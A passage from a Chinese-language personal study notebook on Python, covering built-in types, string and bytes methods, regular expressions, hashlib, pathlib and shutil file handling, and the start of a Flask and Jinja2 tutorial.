<tr><td><code>min(s)</code></td><td><em>s</em> 的最小项</td></tr>
</tbody></table>
</div>
<pre><code class="language-python">a = [1,2,3,5,4]
a[0],a[1],a[-1],a[:4],a[0:4],a[0:4:2]	#切片操作，返回列表的一个浅拷贝。想想这些都是什么值。换句话说，修改这些值会改变原来列表的值
a[i] = 1	#利用浅拷贝特性修改列表的值
a.append(6)	#添加元素
a.pop(index)	#删除index位置的元素（也可以负数倒数），默认index=-1
a.extend()		#将列表元素（或任何可迭代的元素）添加到当前列表的末尾
a.insert(index,value)	#在指定位置添加元素
len(a)	#获得a的长度
a.sort(key=Function)	#列表排序,key指定排序规则
</code></pre>
<pre><code class="language-Python">range类型是不可变的数字序列
range(start,end,step)	#range类型的构造器函数
</code></pre>
<p>我们知道python中的列表变量，其实是对列表的一个引用(reference).在下面的例子中，对b的修改同样会对a造成改变。我们可以用copy模块的deepcopy和copy函数避免这一现象。</p>
<pre><code class="language-python">import copy
a = [1,2,[3,4]]
b = a
c = copy.copy(a)        #把引用里的内容都复制一遍，形成一个新的列表
d = copy.deepcopy(a)    #deepcopy()函数将同时复制它们内部的列表。递归的把引用里的引用的内容都复制了
</code></pre>
<p>list可能很像数组。但是没有那么好用。numpy模块提供的数组更加好用。python标准库好像也有array模块。</p>
<pre><code class="language-python">import numpy as py
two_d = np.zeros(15).reshape(5,3)	#创建一个5*3的数组
</code></pre>
<p>和List很像的还有tuple，可以认为是不可变的list</p>
<h3 id="dict-1"><a class="header" href="#dict-1">Dict</a></h3>
<p>Python内置了字典：dict的支持，dict全称dictionary，在其他语言中也称为map，使用键-值（key-value）存储，具有极快的查找速度。但需要占用大量的内存。</p>
<pre><code class="language-python">d = {'URL': 'www.baidu.com', 'Code': 202}	
d['Body'] = '123'	#添加键值对
d.get(&quot;URL&quot;)	#返回key对应的value，并且在key不存在时返回None
d.values(),d.keys()		#顾名思义 
d.items()	#返回的是所有的键值对tuple
#上面两个方法返回的都是视图对象view objects.该对象提供字典条目的一个动态视图。
</code></pre>
<p>dict的key必须是<strong>不可变对象</strong>，因为dict通过计算key的Hash来确定value的地址。</p>
<h3 id="set-1"><a class="header" href="#set-1">Set</a></h3>
<p>set是集合，也可以认为是没有value的字典？</p>
<pre><code class="language-python">s = {1,2,3}	
s.add(4)
s.remove(4)	#删除元素，如果不在会报错。先in判断一下
</code></pre>
<p>https://docs.python.org/zh-cn/3/library/heapq.html)</p>
<h3 id="examples-1"><a class="header" href="#examples-1">Examples</a></h3>
<p>字符数组变字符串：<code> ''.join(['a','b','c'])</code>
列表去重(a是一个列表)： <code>a=list(set(a))</code>
快速创建字典，用<strong>zip</strong>函数<code>dict(zip(['a','b'],[1,2]))</code>=》<code>{'a': 1, 'b': 2}</code></p>
<h2 id="string-and-bytes"><a class="header" href="#string-and-bytes">String and Bytes</a></h2>
<p>https://docs.python.org/3.9/library/stdtypes.html?highlight=bytes#bytes</p>
<h3 id="str-1"><a class="header" href="#str-1">str</a></h3>
<p>str是由 Unicode 码位构成的<strong>不可变序列</strong>。</p>
<pre><code class="language-python">#注意这里返回的都是原来字符串的副本，原来的字符串并没有被改变。
str.encode()	#返回原字符串编码为字节串对象的版本。 默认编码为 `'utf-8'`。
str.format(*args,**kwargs)	#格式化字符串
str.find(sub)	#返回子字符串 sub 在 s 被找到的最小索引。 可选参数 start 与 end 会被解读为切片表示法。 如果 sub 未被找到则返回 -1。
str.rfind()	#返回子字符串 sub 在 s 被找到的最大索引。
'py' in 'python'	#检测是否是子串
str.upper(),str.lower()	#转大、小写
str.count(sub[, start[, end]])	#反回子字符串 sub 在 [start, end] 范围内非重叠出现的次数。 可选参数 start 与 end 会被解读为切片表示法。
str.replace(old,new)	#把str的old子串换成new子串	
str.split(sep)	#返回一个由字符串内单词组成的列表，使用 sep 作为分隔字符串。这个方法在PTA这种算法题中很常见啊O(∩_∩)O哈哈~
str.strip(chars)	#返回原字符串的副本，移除其中的前导和末尾字符。 chars 参数为指定要移除字符的字符串。 如果省略或为 None，则 chars 参数默认移除空格符。char可以指定多个character
</code></pre>
<p><code>str.format()</code><a href="https://docs.python.org/3.9/library/string.html#formatstrings">的用法</a></p>
<pre><code>format_spec     ::=  [[fill]align][sign][#][0][width][grouping_option][.precision][type]
fill            ::=  &lt;any character&gt;
align           ::=  &quot;&lt;&quot; | &quot;&gt;&quot; | &quot;=&quot; | &quot;^&quot;
sign            ::=  &quot;+&quot; | &quot;-&quot; | &quot; &quot;
width           ::=  digit+
grouping_option ::=  &quot;_&quot; | &quot;,&quot;
precision       ::=  digit+
type            ::=  &quot;b&quot; | &quot;c&quot; | &quot;d&quot; | &quot;e&quot; | &quot;E&quot; | &quot;f&quot; | &quot;F&quot; | &quot;g&quot; | &quot;G&quot; | &quot;n&quot; | &quot;o&quot; | &quot;s&quot; | &quot;x&quot; | &quot;X&quot; | &quot;%&quot;
</code></pre>
<p>字符串转数字</p>
<pre><code>string = '4D'
print(int(string,base=16),end=' ')
string = '0x4D'
print(int(string,base=16))
</code></pre>
<p>字符串操作</p>
<pre><code class="language-python">x = &quot;4D 4D 4D 77 6A 61 75 60 53 5D 5D 53 7D 79 62 53 3F 34 3A 3B 35 3A 3C  34 3C 71 &quot;
#移除其中的前导和末尾字符,默认是空格
x = x.strip(' ')
#根据指定字符分割字符串为列表
list = x.split(' ')
print(list)
#字符串倒序
print(&quot;}080697683_nuq_qq_3oa1X_amuot{AAA&quot;[::-1])

</code></pre>
<p>格式化字符串format</p>
<pre><code class="language-python">print(&quot;binary:{0:b}\noct:{0:o}\n前缀hex:{0:#x}\ndec:{0:d}\n&quot;.format(10))
#进制转换
print(&quot;{0:+f}\t{0:-f}\t{0: f}&quot;.format(3.14))
print(&quot;{0:+f}\t{0:-f}\t{0: f}&quot;.format(-3.14))
#符号问题
coord = (3, 5)
print( 'X: {0[0]};  Y: {0[1]}'.format(coord))
#访问列表的项
</code></pre>
<h3 id="bytes"><a class="header" href="#bytes">bytes</a></h3>
<p>和str一样，bytes也是不可变序列。bytes 对象是由单个字节构成的不可变序列。 str用来操作文本，而bytes用来操作二进制数据。</p>
<pre><code class="language-Python">x = b'\x30\x31\x32'		#bytes对象的字面量，每个数字大小在0-0xff之间
x.hex([sep])		#返回一个字符串对象，该对象包含实例中每个字节的两个十六进制数字，用sep分隔。
x.decode('utf-8')		#解码
x[0]		#返回一个0-0xff的数字	
x[0:1]		#返回一个bytes

bytes([source[, encoding[, errors]]])	#一个内置方法，把source转换成bytes类型。
int.to_bytes()
int.from_bytes()	#int的static methods,顾名思义是转换成bytes和转换到bytes
</code></pre>
<p><a href="https://www.programiz.com/python-programming/methods/built-in/bytes">bytes()函数的优秀参考</a></p>
<h3 id="bytearray"><a class="header" href="#bytearray">bytearray</a></h3>
<p>bytearray是bytes的可变序列形式。</p>
<h2 id="builtin-function"><a class="header" href="#builtin-function">Builtin Function</a></h2>
<p>https://docs.python.org/3.8/library/functions.html#built-in-functions</p>
<h3 id="enumerate-列举"><a class="header" href="#enumerate-列举">enumerate 列举</a></h3>
<pre><code class="language-python">#	enumerate(iterable, start=0)
&gt;&gt;&gt; list(enumerate(seasons))
[(0, 'Spring'), (1, 'Summer'), (2, 'Fall'), (3, 'Winter')]
</code></pre>
<h3 id="evalexec-执行字符串"><a class="header" href="#evalexec-执行字符串">eval,exec 执行字符串</a></h3>
<pre><code class="language-python">eval(expression[, globals[, locals]])	#The arguments are a string and optional globals and locals. If provided, globals must be a dictionary. If provided, locals can be any mapping object.The expression argument is parsed and evaluated as a Python expression (technically speaking, a condition list) using the globals and locals dictionaries as global and local namespace.
</code></pre>
<pre><code class="language-python">exec(object[, globals[, locals]])
#这个函数支持动态执行 Python 代码。object 必须是字符串或者代码对象
</code></pre>
<pre><code class="language-python">isinstance(object, classinfo)
如果参数 object 是参数 classinfo 的实例或者是其 (直接、间接或 虚拟) 子类则返回 True。
</code></pre>
<h3 id="open-打开文件"><a class="header" href="#open-打开文件">open 打开文件</a></h3>
<pre><code class="language-python">open(file, mode='r', buffering=-1, encoding=None, errors=None, newline=None, closefd=True, opener=None)
#打开 file 并返回对应的 file object。如果该文件不能打开，则触发 OSError。
#'r' 读取（默认）'w' 写入，并先截断文件'x' 排它性创建，如果文件已存在则失败'a' 写入，如果文件存在则在末尾追加'b' 二进制模式't' 文本模式（默认）'+' 打开用于更新（读取与写入）
</code></pre>
<h3 id="filter-过滤器"><a class="header" href="#filter-过滤器">filter 过滤器</a></h3>
<p><code>filter(*function*, *iterable*)</code>比如<code>fil = list(filter(lambda x: x&gt;10,[1,11,2,45,7,6,13]))</code></p>
<p>Construct an <strong>iterator</strong> from those elements of <em>iterable</em> for which <em>function</em> returns true.在函数中设定过滤条件，迭代元素，保留返回值为 True 的元素。</p>
<h3 id="round-四舍五入"><a class="header" href="#round-四舍五入">round 四舍五入</a></h3>
<p><code>round(10.0222222, 3)</code>=&gt;10.022</p>
<h3 id="help-查看帮助"><a class="header" href="#help-查看帮助">help 查看帮助</a></h3>
<h3 id=""><a class="header" href="#">...</a></h3>
<p><code>len()</code>获得长度，<code>print()</code>输出，<code>input</code>获得输入。</p>
<p><code>sum()</code>求和，<code>sorted</code>排序</p>
<h2 id="regex-正则表达式"><a class="header" href="#regex-正则表达式">RegEx 正则表达式</a></h2>
<h3 id="about-re"><a class="header" href="#about-re">About RE</a></h3>
<p>30分钟入门正则表达式:https://deerchao.cn/tutorials/regex/regex.htm</p>
<div class="table-wrapper"><table><thead><tr><th>匹配单个字符</th><th style="text-align: left">内容</th></tr></thead><tbody>
<tr><td>.</td><td style="text-align: left">任意字符(除了回车)</td></tr>
<tr><td>\d</td><td style="text-align: left">数字</td></tr>
<tr><td>\D</td><td style="text-align: left">非数字</td></tr>
<tr><td>\s</td><td style="text-align: left">空白字符</td></tr>
<tr><td>\S</td><td style="text-align: left">非空白字符</td></tr>
<tr><td>\w</td><td style="text-align: left">单词字符</td></tr>
<tr><td>\W</td><td style="text-align: left">非单词字符</td></tr>
<tr><td>\.</td><td style="text-align: left">匹配.号,\是转义字符</td></tr>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>数量限定字符</th><th>内容</th></tr></thead><tbody>
<tr><td>*</td><td>匹配前一个字符0次或无限次</td></tr>
<tr><td>+</td><td>匹配前一个字符1次或无限次</td></tr>
<tr><td>?</td><td>匹配前一个字符0次或1次</td></tr>
<tr><td>{m}</td><td>匹配前一个字符m次</td></tr>
<tr><td>{m,n}</td><td>匹配前一个字符m-n次</td></tr>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>位置限定字符</th><th>内容</th></tr></thead><tbody>
<tr><td>(exp)</td><td>匹配exp并捕获到自动命名的组中</td></tr>
<tr><td>(? <name>exp)</td><td>匹配exp并捕获到名为name的组中</td></tr>
<tr><td>(?:exp)</td><td>匹配exp但是不捕获匹配的文本</td></tr>
<tr><td>(?=exp)</td><td>匹配exp前面的位置</td></tr>
<tr><td>(?&lt;=exp)</td><td>匹配exp后面的位置</td></tr>
<tr><td>(?!exp)</td><td>匹配后面不是exp的位置</td></tr>
<tr><td>(?&lt;!exp)</td><td>匹配前面不是exp的位置</td></tr>
</tbody></table>
</div>
<h3 id="functions"><a class="header" href="#functions">Functions</a></h3>
<pre><code class="language-python">import re
re.compile()
	#匹配
pattern.match(string)	#如果 string 开始的0或者多个字符匹配到了正则表达式样式，就返回一个相应的 匹配对象 。 如果没有匹配，就返回 None ；注意它跟零长度匹配是不同的。
re.fullmatch(pattern, string, flags=0)	# 如果整个 string 匹配到正则表达式样式，就返回一个相应的 匹配对象 。 否则就返回一个 None ；注意这跟零长度匹配是不同的。
re.search(pattern, string, flags=0)		# 扫描整个 字符串 找到匹配样式的第一个位置，并返回一个相应的 匹配对象。如果没有匹配，就返回一个 None ； 注意这和找到一个零长度匹配是不同的。
#和match的区别在于Search可以从任一一个位置开始匹配.
	#查找
re.findall(pattern, string, flags=0)	# 对 string 返回一个不重复的 pattern 的匹配列表， string 从左到右进行扫描，匹配按找到的顺序返回。如果样式里存在一到多个组，就返回一个组合列表；就是一个元组的列表（如果样式里有超过一个组合的话）。空匹配也会包含在结果里。
re.finditer(pattern, string, flags=0)
#pattern 在 string 里所有的非重复匹配，返回为一个迭代器 iterator 保存了 匹配对象 。 string 从左到右扫描，匹配按顺序排列。空匹配也包含在结果里。
	#修改
re.split()	#用 pattern 分开 string 。
re.sub(pattern, repl, string) # 返回通过使用 repl 替换在 string 最左边非重叠出现的 pattern 而获得的字符串。
</code></pre>
<h3 id="examples-2"><a class="header" href="#examples-2">Examples</a></h3>
<p>正则表达式主要的功能可以分为两个,<strong>查找Search</strong>和<strong>匹配Match</strong>。</p>
<p>匹配方法:fullmatch(),match(),search</p>
<pre><code class="language-python">import re
reg = re.compile(&quot;&lt;p&gt;(.*)&lt;/p&gt;&quot;)
match = reg.match(text)
if match:
    print(&quot;match&quot;)
</code></pre>
<p>查找主要方法是find(),findall(),finditer()</p>
<pre><code class="language-python">import re
text = &quot;&quot;&quot;&lt;p&gt;&lt;strong&gt;说明：&lt;/strong&gt; 如果需要匹配的字符是正则表达式中的特殊字符，那么可以使用\进行转义处理，例如想匹配小数点可以写成\.就可以了，因为直接写.会匹配任意字符；同理，想匹配圆括号必须写成\(和\)，否则圆括号被视为正则表达式中的分组。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;h3-python-&quot;&gt;&lt;a name=&quot;Python对正则表达式的支持&quot; class=&quot;reference-link&quot;&gt;&lt;/a&gt;&lt;span class=&quot;header-link octicon octicon-link&quot;&gt;&lt;/span&gt;Python对正则表达式的支持&lt;/h3&gt;&lt;p&gt;Python提供了re模块来支持正则表达式相关操作，下面是re模块中的核心函数。&lt;/p&gt;&quot;&quot;&quot;

reg = re.compile(&quot;&lt;p&gt;(.*)&lt;/p&gt;&quot;)
match = reg.findall(text)
for i in match:
    print(i)	#findall返回一个元素都是str的列表
</code></pre>
<p>修改数据，主要方法是sub(),split()</p>
<pre><code class="language-python">text = '''# 搜索引擎的使用
高级搜索 https://g.luciaz.me/advanced_search?hl=en&amp;fg=1
综合搜索 https://search.chongbuluo.com/'''

pattern = re.compile(&quot;(.*?) (https?://.*/?)&quot;)
t = pattern.sub(lambda m: &quot;[{}]({}){}&quot;.format(m.group(1),m.group(2),m.group(2)),text)
#pattern.sub()，第一个参数是修改方法，第二个参数是目标文本。
#注意这里的Match对象m，m.group(0)默认是整个，然后index才会根据（）依次向后
print(t)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="container"><a class="header" href="#container">Container</a></h1>
<p><code>list</code></p>
<p><code>set</code></p>
<p><code>dict</code></p>
<p><code>array.array</code>和C语言中的数组一样。他和<code>list</code>很像，但是存储的不是对象而是直接的内容。他也支持所有和可变序列有关的操作。创建数组需要一个<a href="https://docs.python.org/zh-cn/3.10/library/array.html?highlight=array#array.array">类型码</a>，用来表示在底层的C语言应该存放怎样的数据类型。不过使用数组，numpy库也许是更好的选择。</p>
<pre><code class="language-python">from array import array
array('l', [1, 2, 3, 4, 5])
</code></pre>
<p><code>collections.deque</code>是一个线程安全，可以快速从两端添加或者删除元素的数据类型，也就是双向队列。用它来模拟队列或堆都是很好的选择。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="crypto-1"><a class="header" href="#crypto-1">Crypto</a></h1>
<h2 id="hash-2"><a class="header" href="#hash-2">Hash</a></h2>
<p>Python的Hash算法主要是hashlib库，他的底层支持来自openssl。</p>
<p><img src="Language/Python/4%E5%A5%BD%E7%94%A8%E7%9A%84%E5%BA%93/../images/1605685185153.png" alt="" />
<code>hashlib.algorithms_available</code>可以查看可用的算法，比如在我的电脑上：
<code>{'blake2b512', 'md4', 'md5', 'sha512', 'blake2s256', 'sha224', 'sha256', 'ripemd160', 'sha384', 'whirlpool', 'md5-sha1', 'sha1'}</code></p>
<ul>
<li>简单的示例
这是上面那个流程图的demo</li>
</ul>
<pre><code class="language-python"># Create a SHA-256 hash object. There is one constructor method named for each type of hash. All return a hash object with the same simple interface.
x = hashlib.sha256()	
#用 bytes-like object 来更新哈希对象。 重复调用相当于单次调用并传入所有参数的拼接结果: m.update(a); m.update(b) 等价于 m.update(a+b)。	
m.update(data)	
#输出x的摘要
print(x.digest(), x.hexdigest())
</code></pre>
<h2 id="cryptography第三方"><a class="header" href="#cryptography第三方">cryptography（第三方）</a></h2>
<p>https://cryptography.io/en/latest/</p>
<blockquote>
<p>Cryptography includes both high level recipes and low level interfaces to common cryptographic algorithms such as symmetric ciphers, message digests, and key derivation functions.</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="enum"><a class="header" href="#enum">enum</a></h1>
<p><code>@unique</code>装饰器帮我们检查是否有重复的定义。</p>
<pre><code class="language-python">from enum import Enum, unique, IntEnum

@unique
class GenderA(IntEnum):
    Male = 0
    Female = 1

@unique
class GenderB(Enum):
    Male = &quot;Male&quot;
    Female = &quot;Female&quot;

a = GenderA.Female
b = GenderB.Female
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="file-system-1"><a class="header" href="#file-system-1">File System</a></h1>
<h2 id="ospath"><a class="header" href="#ospath">os.path</a></h2>
<p>不推荐，推荐使用下面介绍的Pathlib。</p>
<h3 id="路径解析"><a class="header" href="#路径解析">路径解析</a></h3>
<pre><code class="language-python">&gt;&gt;&gt; import os.path
&gt;&gt;&gt; os.path.split(&quot;/home/reticence/hello.txt&quot;)
('/home/reticence', 'hello.txt')
&gt;&gt;&gt; os.path.dirname(&quot;/home/reticence/hello.txt&quot;)
'/home/reticence'
&gt;&gt;&gt; os.path.basename(&quot;/home/reticence/hello.txt&quot;)
'hello.txt'
&gt;&gt;&gt; os.path.splitext(&quot;/home/reticence/hello.txt&quot;)
('/home/reticence/hello', '.txt')
</code></pre>
<h3 id="路径创建"><a class="header" href="#路径创建">路径创建</a></h3>
<p><code>normpath</code>可以规范化路径。<code>abspath</code>可以创建绝对路径，创建的绝对路径取决于当前路径<code>.</code>。</p>
<pre><code class="language-python">&gt;&gt;&gt; import os.path
&gt;&gt;&gt; os.path.join(&quot;/&quot;,&quot;home&quot;,&quot;reticence&quot;)
'/home/reticence'
&gt;&gt;&gt; os.path.normpath(&quot;/home/reticence/..&quot;)
'/home'
&gt;&gt;&gt; os.path.abspath(&quot;aaa&quot;)
'/home/reticence/aaa'
</code></pre>
<h3 id="文件属性测试"><a class="header" href="#文件属性测试">文件属性测试</a></h3>
<p>文件的访问(access)时间、修改(modified)时间、创建(create)时间获取。用<code>ctime</code>把获得的绝对秒数转换成可读的时间。</p>
<pre><code class="language-python">&gt;&gt;&gt; import os.path
&gt;&gt;&gt; import time
&gt;&gt;&gt; time.ctime(os.path.getatime(&quot;/home/reticence/&quot;))
'Sun Mar 13 00:00:59 2022'
&gt;&gt;&gt; time.ctime(os.path.getmtime(&quot;/home/reticence/&quot;))
'Sat Mar 12 23:59:34 2022'
&gt;&gt;&gt; time.ctime(os.path.getctime(&quot;/home/reticence/&quot;))
'Sat Mar 12 23:59:34 2022'
</code></pre>
<p>下面这些测试返回Boolean值。如果文件不存在的话都是False。</p>
<pre><code class="language-python">&gt;&gt;&gt; import os.path
&gt;&gt;&gt; filename = &quot;/home/reticence/&quot;
&gt;&gt;&gt; os.path.isabs(filename)
True
&gt;&gt;&gt; os.path.isfile(filename)
False
&gt;&gt;&gt; os.path.isdir(filename)
True
&gt;&gt;&gt; os.path.islink(filename)
False
&gt;&gt;&gt; os.path.ismount(filename)
False
&gt;&gt;&gt; os.path.exists(filename)
True
</code></pre>
<h2 id="pathlib-star2"><a class="header" href="#pathlib-star2">Pathlib :star2:</a></h2>
<p>提供了更高级的，更面向对象的处理路径的方式。下面列出了大部分方法，完整的列表可以参考标准库。</p>
<h3 id="创建路径"><a class="header" href="#创建路径">创建路径</a></h3>
<p>路径的表示在Windows和Posix标准是不同的（主要就是<code>/</code>和<code>\</code>，真的SB），不过如果我们不是要在Windows上处理Posix的路径（或相反），一般不用考虑这个问题。</p>
<p><img src="Language/Python/4%E5%A5%BD%E7%94%A8%E7%9A%84%E5%BA%93//Users/bytedance/Documents/note/Python/images/pathlib-inheritance.png" alt="../_images/pathlib-inheritance.png" /></p>
<p>看创建路径的写法，难怪大家都说Python写起来很爽，就像写英语句子一样。用<code>Path</code>方法就好了。</p>
<pre><code class="language-python">&gt;&gt;&gt; home = pathlib.Path('/home')
&gt;&gt;&gt; home / 'reticence'   # 重载了/运算符
PosixPath('/home/reticence')
&gt;&gt;&gt; home.joinpath('aaa','bbb')
PosixPath('/home/aaa/bbb')
</code></pre>
<p>有一些特殊路径</p>
<pre><code class="language-python">&gt;&gt;&gt; Path.home()
PosixPath('/Users/bytedance')
&gt;&gt;&gt; Path.cwd()
PosixPath('/Users/bytedance')
</code></pre>
<h3 id="操作文件"><a class="header" href="#操作文件">操作文件</a></h3>
<p>注意文件的创建是如果已经存在会出错，文件的删除是如果不存在会出错。可以先用<code>file.exist()</code>检查一下。</p>
<pre><code class="language-python">&gt;&gt;&gt; file = pathlib.Path(&quot;/home/reticence/code/aaa&quot;)
&gt;&gt;&gt; file.touch()
&gt;&gt;&gt; file.unlink()
&gt;&gt;&gt; file.mkdir()
&gt;&gt;&gt; file.rmdir()
&gt;&gt;&gt; file.chmod(755)    
</code></pre>
<h3 id="文件元信息"><a class="header" href="#文件元信息">文件元信息</a></h3>
<p>可以获得文件的元信息。</p>
<pre><code class="language-python">&gt;&gt;&gt; file = pathlib.Path(&quot;/home/reticence/code/aaa&quot;)
&gt;&gt;&gt; file.is_file()
False
&gt;&gt;&gt; file.is_dir()
True
&gt;&gt;&gt; file.is_absolute()
True
&gt;&gt;&gt; file.is_mount()
False
&gt;&gt;&gt; file.is_symlink()
False
&gt;&gt;&gt; file.stat()
os.stat_result(st_mode=16872, st_ino=404885, st_dev=16777221, st_nlink=58, st_uid=501, st_gid=20, st_size=1856, st_atime=1659193212, st_mtime=1659193211, st_ctime=1659193211)
&gt;&gt;&gt; file.owner()
'bytedance'
&gt;&gt;&gt; file.owner()
'bytedance'
</code></pre>
<h3 id="打开文件和遍历目录"><a class="header" href="#打开文件和遍历目录">打开文件和遍历目录</a></h3>
<p>还可以更优雅的打开文件、遍历目录。遍历目录得到的结果也是<code>PosixPath</code>(Linux)。</p>
<pre><code class="language-python">file = pathlib.Path(&quot;/home/reticence/code/aaa&quot;)
# 如果file是一个文件
with file.open('r',encoding='utf-8') as fileobj:
    pass
# 还提供了简易的读写操作
# 读写文本文件
&gt;&gt;&gt; a.write_text(&quot;a&quot;)
1
&gt;&gt;&gt; a.read_text()
'a'
# 读写二进制文件
&gt;&gt;&gt; a.write_bytes(b&quot;\x11&quot;)
1
&gt;&gt;&gt; a.read_bytes()
b'\x11'
</code></pre>
<p>遍历目录</p>
<pre><code class="language-python"># 如果file是一个目录，简单的遍历目录
for f in file.iterdir():
  print(f)
# glob提供了简易的正则表达式（Unix的正则）
for f in file.glob(&quot;*.py&quot;):
  print(f)
</code></pre>
<h3 id="解析路径"><a class="header" href="#解析路径">解析路径</a></h3>
<pre><code class="language-python">&gt;&gt;&gt; file = pathlib.Path(&quot;/home/reticence/code/aaa.bbb&quot;)
&gt;&gt;&gt; file.parts
('/', 'home', 'reticence', 'code', 'aaa.bbb')
&gt;&gt;&gt; file.parent
PosixPath('/home/reticence/code')
&gt;&gt;&gt; file.name
'aaa.bbb'
&gt;&gt;&gt; file.stem, file.suffix
('aaa', '.bbb')
</code></pre>
<h2 id="shutil"><a class="header" href="#shutil">shutil</a></h2>
<p>提供了更高层的文件操作，比如复制。<code>copy2</code>类似于<code>copy</code>，不过复制到新文件的元数据包含访问和修改时间。<code>copytree</code>可以认为是复制整个目录，目标目录必须不存在。</p>
<pre><code class="language-python">&gt;&gt;&gt; b = pathlib.Path('/home/reticence/code/aaa/bbb')
&gt;&gt;&gt; c = pathlib.Path('/home/reticence/code/aaa/ccc')
&gt;&gt;&gt; shutil.copy(src = b,dst = c)
&gt;&gt;&gt; shutil.copy2(src = b,dst = c)
&gt;&gt;&gt; shutil.copytree(src = b.parent,dst = c)
</code></pre>
<p>还有<code>which</code>操作，和Shell里的which一个意思。</p>
<pre><code class="language-python">&gt;&gt;&gt; shutil.which(&quot;ls&quot;)
'/usr/bin/ls'
</code></pre>
<p>还可以归档和压缩文件。<code>get_archive_formats</code>可以展示当前环境支持哪些格式。</p>
<pre><code class="language-python">&gt;&gt;&gt; shutil.get_archive_formats()
[('bztar', &quot;bzip2'ed tar-file&quot;), ('gztar', &quot;gzip'ed tar-file&quot;), ('tar', 'uncompressed tar file'), ('xztar', &quot;xz'ed tar-file&quot;), ('zip', 'ZIP file')]
&gt;&gt;&gt; shutil.make_archive(&quot;./play.py&quot;, format=&quot;tar&quot;)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="python-flask"><a class="header" href="#python-flask">Python-Flask</a></h1>
<p>参考资料：《FlaskWeb开发 基于Python开发的Web》，<a href="https://dormousehole.readthedocs.io/en/latest/">Flask官方文档</a>。</p>
<h2 id="flask概述"><a class="header" href="#flask概述">Flask概述</a></h2>
<p>Flask是一个用Python编写的Web应用程序框架。 它由 <strong>Armin Ronacher</strong> 开发，他领导一个名为Pocco的国际Python爱好者团队。 Flask基于Werkzeug WSGI工具包和Jinja2模板引擎。两者都是Pocco项目。</p>
<ul>
<li>
<p>Web Application Framework（Web应用程序框架）或简单的Web Framework（Web框架）表示一个库和模块的集合，使Web应用程序开发人员能够编写应用程序，而不必担心协议，线程管理等低级细节。</p>
</li>
<li>
<p>WSGI（Web Server Gateway Interface，Web服务器网关接口）已被用作Python Web应用程序开发的标准。 WSGI是Web服务器和Web应用程序之间通用接口的规范。</p>
</li>
<li>
<p>Werkzeug是一个WSGI工具包，它实现了请求，响应对象和实用函数。 这使得能够在其上构建web框架。 Flask框架使用Werkzeug作为其基础之一。</p>
</li>
<li>
<p>jinja2是Python的一个流行的模板引擎。Web模板系统将模板与特定数据源组合以呈现动态网页。</p>
</li>
</ul>
<h2 id="环境搭建-1"><a class="header" href="#环境搭建-1">环境搭建</a></h2>
<ul>
<li>
<p>我们利用virtualenv搭建一个独立的python环境。首先安装virtualenv：
<code>sudo apt-get install python-virtualenv</code></p>
</li>
<li>
<p>然后创建一个本地环境，切换到你的工作目录。更多选项可以help：
<code>virtualenv -p python3 venv</code></p>
</li>
<li>
<p>激活venv环境和取消激活：
<code>source venv/bin/activate</code>和<code>deactivate</code></p>
</li>
<li>
<p>然后利用pip安装flask。不知道为什么我需要翻墙才行，我的源应该就是国内的。
<code>pip install flask</code></p>
</li>
<li>
<p>建一个git仓库，如果不想把环境也带进去的话就编辑.gitignore文件
<code>git init</code> 
修改.gitignore，添加/venv/</p>
</li>
</ul>
<p>如果你能正常的<code>import flask</code>，环境就搭建完成了。另外的，推荐使用vscode。当然能用专业版的Pycharm就更香了。</p>
<h2 id="demo-1"><a class="header" href="#demo-1">Demo</a></h2>
<pre><code class="language-python">from flask import Flask

app = Flask(__name__)

@app.route('/')
def index():
    return &quot;&lt;h1&gt;Hello world&lt;/h1&gt;&quot;

if __name__=='__main__':
    app.run()
</code></pre>
<p><code>app.run(host, port, debug, options)</code>表示运行应用程序，所有的参数都是可选的。</p>
<p>一些概念：</p>
<ul>
<li>上面的<code>index</code>函数称为<strong>视图函数view function</strong>。</li>
<li>index函数的返回值称为<strong>响应response</strong>。</li>
<li>处理URL和函数之间关系的程序称为<strong>路由</strong>。我们把<code>/</code>和<code>index</code>函数绑定在了一起。</li>
</ul>
<h2 id="知识储备-前端"><a class="header" href="#知识储备-前端">知识储备-前端</a></h2>
<h3 id="css-js-html"><a class="header" href="#css-js-html">CSS JS HTML</a></h3>
<p>这三个是前端的基础，尤其是HTML是必须要知道，至少能看懂的。不然就真的瞎了。</p>
<h3 id="模板-jinja2star"><a class="header" href="#模板-jinja2star">模板 Jinja2:star:</a></h3>
<p>jinja2是一个强大的模板引擎，和flask一起安装。</p>
<p>首先推荐一个VS code插件<a href="https://marketplace.visualstudio.com/items?itemName=WyattFerguson.jinja2-snippet-kit">Jinja2 Snippet Kit</a>，他可以帮你自动补全，补全规则如下，也涵盖了Jinja模板的几乎所有功能：</p>
<div class="table-wrapper"><table><thead><tr><th>Prefix</th><th>Output</th></tr></thead><tbody>
<tr><td><strong>jblock</strong></td><td><code>{% block *name* %} {% endblock *name* %}</code></td></tr>
<tr><td>jif</td><td><code>{% if *cond* %} {% endif %}</code></td></tr>
<tr><td>jifelse</td><td><code>{% if *cond* %} {% else %} {% endif %}</code></td></tr>
<tr><td>jextend</td><td><code>{% extends '*file*' %}</code></td></tr>
<tr><td>jfor</td><td><code>{% for *A* in *B* %} {% endfor %}</code></td></tr>
<tr><td>jrandom</td><td>`{{ range(<em>MIN</em>, <em>MAX</em>)</td></tr>
<tr><td><strong>jvar</strong></td><td><code>{{ *variable* }}</code></td></tr>
<tr><td>jfunc</td><td><code>{% *function* %}</code></td></tr>
<tr><td>jround</td><td>`{% <em>float</em></td></tr>
<tr><td>jjoin</td><td>`{% <em>list</em></td></tr>
<tr><td>jset</td><td><code>{% set *A* = *B* %}</code></td></tr>
<tr><td>jurl</td><td><code>{{ url_for('*dir*', filename='*file*') }}</code></td></tr>
<tr><td>jcall</td><td><code>{% call *func* %} {% endcall %}</code></td></tr>
<tr><td>jfilter</td><td><code>{% filter *cmd* %} {% endfilter %}</code></td></tr>
<tr><td><strong>jinclude</strong></td><td><code>{% include '*file*' %}</code></td></tr>
<tr><td>jfrom</td><td><code>{% from '*dir*' import *func* %}</code></td></tr>
